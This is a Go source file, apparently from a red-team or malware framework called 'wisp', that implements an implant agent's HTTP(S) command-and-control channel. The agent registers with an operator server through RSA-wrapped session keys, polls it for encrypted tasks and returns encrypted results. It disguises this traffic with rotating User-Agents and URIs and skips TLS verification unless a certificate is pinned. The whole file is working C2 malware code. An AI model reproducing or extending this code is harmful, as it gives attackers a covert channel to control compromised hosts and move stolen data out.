package transport

import (
	"bytes"
	"crypto/rand"
	"crypto/tls"
	"encoding/base64"
	"encoding/binary"
	"encoding/json"
	"fmt"
	"io"
	"net"
	"net/http"
	"time"

	"github.com/user/wisp/agent/config"
	"github.com/user/wisp/shared/protocol"
)

// HTTPTransport implements the polling-based HTTP(S) C2 channel.
// It mirrors the wire format of TCPTransport (RSA key exchange + AES session
// encryption) but frames the payloads in JSON over HTTP.
type HTTPTransport struct {
	Host      string
	Port      int
	UseTLS    bool
	AgentID   string
	Keys      *protocol.SessionKeys
	RSAPubPEM string

	// Fingerprint optionally pins the server TLS certificate (hex SHA-256).
	Fingerprint string

	// TrafficProfile drives per-request UA rotation / URI alternation
	// (Malleable-profile lite).
	TrafficProfile *config.TrafficProfile

	client *http.Client
	base   string

	seq uint64 // monotonic checkin counter (replay protection)
	ua  uint64 // UA rotation index
	uri uint64 // URI rotation index
}

// SetTrafficProfile configures UA rotation / URI alternation on the transport.
func (t *HTTPTransport) SetTrafficProfile(p *config.TrafficProfile) {
	t.TrafficProfile = p
}

// pickURI rotates across the profile's URIs. When none are set, falls back to
// the fixed path. `shift` advances the rotation so consecutive requests use
// different URIs when a profile lists several.
func (t *HTTPTransport) pickURI(fixed string, shift uint64) string {
	if t.TrafficProfile == nil {
		return t.base + fixed
	}
	// Pinned per-endpoint URI (from the listener's Malleable profile) wins.
	var pinned string
	switch {
	case fixed == "/api/v1/register":
		pinned = t.TrafficProfile.RegisterURI
	case fixed == "/api/v1/checkin":
		pinned = t.TrafficProfile.CheckinURI
	case fixed == "/api/v1/pubkey":
		pinned = t.TrafficProfile.PubKeyURI
	}
	if pinned != "" {
		return t.base + pinned
	}
	if len(t.TrafficProfile.URIs) == 0 {
		return t.base + fixed
	}
	idx := (t.uri + shift) % uint64(len(t.TrafficProfile.URIs))
	t.uri = (t.uri + 1) % uint64(len(t.TrafficProfile.URIs))
	return t.base + t.TrafficProfile.URIs[idx]
}

// applyProfile sets the rotating User-Agent header (if any) on a request.
func (t *HTTPTransport) applyProfile(req *http.Request) {
	if t.TrafficProfile != nil && len(t.TrafficProfile.UserAgents) > 0 {
		ua := t.TrafficProfile.UserAgents[t.ua%uint64(len(t.TrafficProfile.UserAgents))]
		t.ua++
		req.Header.Set("User-Agent", ua)
	}
}

// fetchServerKey retrieves the RSA public key from the server's /pubkey
// endpoint. Used when the binary has no compiled-in key (CLI/dev mode).
func (t *HTTPTransport) fetchServerKey() error {
	req, err := http.NewRequest(http.MethodGet, t.pickURI("/api/v1/pubkey", 0), nil)
	if err != nil {
		return err
	}
	t.applyProfile(req)
	resp, err := t.client.Do(req)
	if err != nil {
		return err
	}
	defer resp.Body.Close()
	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("pubkey endpoint returned %d", resp.StatusCode)
	}
	var out struct {
		PubKey string `json:"pubkey"`
	}
	if err := json.NewDecoder(resp.Body).Decode(&out); err != nil {
		return err
	}
	if out.PubKey == "" {
		return fmt.Errorf("server returned an empty public key")
	}
	t.RSAPubPEM = out.PubKey
	return nil
}

type httpRegisterRequest struct {
	Payload string `json:"payload"`
}

type httpRegisterResponse struct {
	Status string `json:"status"`
	Ack    string `json:"ack"`
}

type httpCheckinRequest struct {
	ID   string `json:"id"`
	Seq  uint64 `json:"seq"`
	Data string `json:"data"`
}

type httpCheckinResponse struct {
	Tasks string `json:"tasks"`
}

// NewHTTPTransport creates an HTTP transport from a base URL and public key.
func NewHTTPTransport(host string, port int, useTLS bool, agentID, rsaPubPEM, fingerprint string) *HTTPTransport {
	scheme := "http"
	if useTLS {
		scheme = "https"
	}
	tlsCfg := &tls.Config{InsecureSkipVerify: true}
	if fingerprint != "" {
		tlsCfg.VerifyPeerCertificate = fingerprintVerifier(fingerprint)
	}
	tr := &http.Transport{TLSClientConfig: tlsCfg}
	return &HTTPTransport{
		Host:        host,
		Port:        port,
		UseTLS:      useTLS,
		AgentID:     agentID,
		RSAPubPEM:   rsaPubPEM,
		Fingerprint: fingerprint,
		client: &http.Client{
			Transport: tr,
			Timeout:   30 * time.Second,
		},
		base: fmt.Sprintf("%s://%s", scheme, net.JoinHostPort(host, fmt.Sprintf("%d", port))),
	}
}

// Register performs the initial agent registration with the server.
func (t *HTTPTransport) Register(regData []byte) error {
	// Agents launched without a compiled-in key (CLI mode) fetch it first.
	if t.RSAPubPEM == "" {
		if err := t.fetchServerKey(); err != nil {
			return fmt.Errorf("fetch server key: %w", err)
		}
	}

	// Generate session keys
	aesKey := make([]byte, 32)
	hmacKey := make([]byte, 32)
	io.ReadFull(rand.Reader, aesKey)
	io.ReadFull(rand.Reader, hmacKey)
	t.Keys = &protocol.SessionKeys{AESKey: aesKey, HMACKey: hmacKey}

	// Hybrid encryption (same as TCP transport)
	keyMaterial := append(aesKey, hmacKey...)
	encryptedKeys, err := protocol.RSAEncrypt([]byte(t.RSAPubPEM), keyMaterial)
	if err != nil {
		return fmt.Errorf("RSA encrypt: %w", err)
	}

	encryptedReg, err := t.Keys.Encrypt(regData)
	if err != nil {
		return fmt.Errorf("encrypt reg data: %w", err)
	}

	// Build payload: [4 bytes key_len][encrypted_keys][encrypted_reg]
	keyLen := uint32(len(encryptedKeys))
	payload := make([]byte, 4+len(encryptedKeys)+len(encryptedReg))
	binary.LittleEndian.PutUint32(payload[0:4], keyLen)
	copy(payload[4:4+keyLen], encryptedKeys)
	copy(payload[4+keyLen:], encryptedReg)

	req := httpRegisterRequest{Payload: base64.StdEncoding.EncodeToString(payload)}
	body, err := json.Marshal(req)
	if err != nil {
		return err
	}

	httpreq, err := http.NewRequest(http.MethodPost, t.pickURI("/api/v1/register", 0), bytes.NewReader(body))
	if err != nil {
		return err
	}
	httpreq.Header.Set("Content-Type", "application/json")
	t.applyProfile(httpreq)
	resp, err := t.client.Do(httpreq)
	if err != nil {
		return fmt.Errorf("register request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode != http.StatusOK {
		return fmt.Errorf("register returned status %d", resp.StatusCode)
	}

	var res httpRegisterResponse
	if err := json.NewDecoder(resp.Body).Decode(&res); err != nil {
		return fmt.Errorf("decode register response: %w", err)
	}
	if res.Status != "ok" {
		return fmt.Errorf("registration rejected")
	}

	// Verify ACK decrypts (proves the server holds the session keys)
	ackData, err := base64.StdEncoding.DecodeString(res.Ack)
	if err != nil {
		return fmt.Errorf("decode ack: %w", err)
	}
	if _, err := t.Keys.Decrypt(ackData); err != nil {
		return fmt.Errorf("decrypt ack: %w", err)
	}

	return nil
}

// Checkin polls the server for tasks, optionally delivering results.
func (t *HTTPTransport) Checkin(results []byte) ([]byte, error) {
	t.seq++
	req := httpCheckinRequest{ID: t.AgentID, Seq: t.seq}
	if len(results) > 0 {
		encrypted, err := t.Keys.Encrypt(results)
		if err != nil {
			return nil, fmt.Errorf("encrypt results: %w", err)
		}
		req.Data = base64.StdEncoding.EncodeToString(encrypted)
	}

	body, err := json.Marshal(req)
	if err != nil {
		return nil, err
	}

	httpreq, err := http.NewRequest(http.MethodPost, t.pickURI("/api/v1/checkin", t.seq), bytes.NewReader(body))
	if err != nil {
		return nil, err
	}
	httpreq.Header.Set("Content-Type", "application/json")
	t.applyProfile(httpreq)
	resp, err := t.client.Do(httpreq)
	if err != nil {
		return nil, fmt.Errorf("checkin request: %w", err)
	}
	defer resp.Body.Close()

	if resp.StatusCode == http.StatusUnauthorized {
		// Session unknown (e.g. after a server restart) → re-register
		return nil, ErrReauth
	}
	if resp.StatusCode != http.StatusOK {
		return nil, fmt.Errorf("checkin returned status %d", resp.StatusCode)
	}

	var res httpCheckinResponse
	if err := json.NewDecoder(resp.Body).Decode(&res); err != nil {
		return nil, fmt.Errorf("decode checkin response: %w", err)
	}

	tasksData, err := base64.StdEncoding.DecodeString(res.Tasks)
	if err != nil {
		return nil, fmt.Errorf("decode tasks: %w", err)
	}
	return t.Keys.Decrypt(tasksData)
}
